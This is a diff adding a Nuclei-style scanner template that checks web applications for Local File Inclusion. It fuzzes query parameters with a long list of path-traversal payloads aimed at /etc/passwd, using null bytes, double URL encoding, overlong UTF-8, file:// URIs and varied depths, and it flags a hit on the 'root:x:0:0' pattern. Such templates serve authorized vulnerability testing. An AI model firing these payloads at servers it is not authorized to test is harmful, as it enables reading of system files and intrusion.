@@ -1,0 +1,78 @@
+id: linux-lfi-automation
+
+info:
+  name: LFI Vulnerability Check
+  author: rix4uni
+  severity: critical
+  description: Checks for Local File Inclusion vulnerabilities
+  tags: lfi,linux
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      reflection:
+        - "/etc/passwd"   #custom
+        - "L2V0Yy9wYXNzd2Q="    #https://twitter.com/GodfatherOrwa/status/1617511891362013184
+        - "../../../../../../etc/./passwd%00"   #https://twitter.com/theXSSrat/status/1459836070602883072
+        - "../../../../../../etc//passwd%00"    #https://twitter.com/theXSSrat/status/1459836070602883072
+        - "../../../../../etc/passwd"   #https://twitter.com/theXSSrat/status/1459836070602883072
+        - "../et*/pas**d"   #https://twitter.com/EverythingVuln1/status/1413887962727677955
+        - "../../../../../../../..//etc/passwd%00"    #https://pswalia2u.medium.com/turning-lfi-into-rce-by-sending-emails-via-smtp-58b499a81de3
+        - ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"   #https://twitter.com/nav1n0x/status/1622529068557078528
+        - "../../../../../../../../../../../../etc/passwd"    #https://twitter.com/krishnsec/status/1544623481110728705
+        - "../../../../../../../../../etc/passwd%00"    #https://twitter.com/noobsec_org/status/1212916676645158913
+        - "file:///etc/passwd"    #https://twitter.com/abdlah_md/status/1569768790291845120
+        - "file:/etc/passwd"    #https://twitter.com/0x_Akoko/status/1461957553378582531
+        - "%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd"   #https://twitter.com/shaybt12/status/1569307439891185664
+        - "//////////////////../../../../../../../../etc/passwd"    #https://twitter.com/nav1n0x/status/1665599964859232258
+        - "../../../etc/passwd"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "../../../etc/passwd%00"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "%252e%252e%252fetc%252fpasswd"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "%252e%252e%252fetc%252fpasswd%00"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "....//....//etc/passwd"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "..///////..////..//////etc/passwd"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"   #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+        - "../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../../etc/passwd"
+        - "../../../../../../../../../etc/passwd"
+        - "../../../../../../../../etc/passwd"
+        - "../../../../../../../etc/passwd"
+        - "../../../../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "../../etc/passwd"
+        - "../etc/passwd"
+        - "/./././././././././././etc/passwd"
+        - "/../../../../../../../../../../etc/passwd"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{reflection}}"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0"
+
+      - type: status
+        status:
+          - 200
